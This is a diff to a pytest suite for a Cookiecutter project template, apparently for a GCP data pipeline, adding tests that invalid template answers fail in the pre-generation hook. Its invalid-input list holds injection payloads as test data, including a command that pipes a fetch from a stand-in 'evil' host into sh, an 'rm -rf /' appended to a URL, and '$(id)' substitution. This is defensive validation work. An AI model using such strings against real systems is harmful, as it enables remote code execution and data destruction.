@@ -242,10 +242,54 @@ def test_matrix_origem_motor_modo_carga(bake: Bake, origem: str, motor: str, mod
     assert ("chaves_merge: [id]" in text) == (modo == "merge")
 
 
-@pytest.mark.parametrize(
-    "contexto",
-    [{"origens": "pubsub"}, {"origens": ""}, {"origens": "arquivo,arquivo"}, {"nome_projeto": "nome inválido!"}],
-)
-def test_unsupported_choices_fail_in_pre_gen(bake: Bake, contexto: dict[str, str]) -> None:
+INVALID = [
+    ("origens", "pubsub", "Tarefa 19"),
+    ("origens", "", "origens"),
+    ("origens", "arquivo,arquivo", "repetidas"),
+    ("origens", 'arq"uivo', "desconhecida"),
+    ("origens", "arq" + chr(92) + "uivo\nx", "desconhecida"),
+    ("nome_projeto", "nome inválido!", "formato esperado"),
+    ("agenda_cron", '0 6 * * 1" \n  injected: x', "formato esperado"),
+    ("agenda_cron", "0 6 * *", "formato esperado"),
+    ("agenda_cron", "@whenever", "formato esperado"),
+    ("projeto_gcp", "a: b\nfoo: bar", "formato esperado"),
+    ("projeto_gcp", "Meu_Projeto", "formato esperado"),
+    ("regiao", "sao paulo", "formato esperado"),
+    ("bucket_bronze", 'x"y', "formato esperado"),
+    ("bucket_bronze", "AB", "formato esperado"),
+    ("dataset_silver", "my-silver", "formato esperado"),
+    ("dataset_gold", "1gold", "formato esperado"),
+    ("versao_biblioteca", "abc", "formato esperado"),
+    ("versao_biblioteca", "1", "formato esperado"),
+    ("repositorio_biblioteca", 'https://x" && curl evil | sh #', "formato esperado"),
+    ("repositorio_biblioteca", "http://github.com/o/r.git", "formato esperado"),
+    ("indice_artifact_registry", "https://x/simple/; rm -rf /", "formato esperado"),
+    ("indice_artifact_registry", "https://x/$(id)", "formato esperado"),
+]
+
+
+@pytest.mark.parametrize(("variavel", "valor", "trecho"), INVALID)
+def test_invalid_answers_fail_in_pre_gen_naming_the_variable(
+    bake: Bake, capfd: pytest.CaptureFixture[str], variavel: str, valor: str, trecho: str
+) -> None:
     with pytest.raises(FailedHookException):
-        bake(**contexto)
+        bake(**{variavel: valor})
+    err = capfd.readouterr().err
+    assert "ERRO ao gerar o projeto" in err
+    assert variavel in err and trecho in err
+    assert "SyntaxError" not in err and "Traceback" not in err
+
+
+def test_valid_alternative_answers_are_accepted(bake: Bake) -> None:
+    root = bake(agenda_cron="@daily", regiao="us-central1", dataset_silver="_silver2", versao_biblioteca="1.12.3")
+    assert 'agenda: "@daily"' in (root / "config/pipeline.yaml").read_text(encoding="utf-8")
+
+
+@pytest.mark.parametrize(
+    ("variavel", "valor"),
+    [("tipo_projeto", "relatorio"), ("motor_ingestao", "spark"), ("modo_carga", "upsert"), ("origem_da_biblioteca", "pip")],
+)
+def test_choice_variables_reject_unknown_values(bake: Bake, variavel: str, valor: str) -> None:
+    """Variáveis de escolha são recusadas pelo próprio Cookiecutter, antes de qualquer arquivo ser gerado."""
+    with pytest.raises(ValueError, match=variavel):
+        bake(**{variavel: valor})
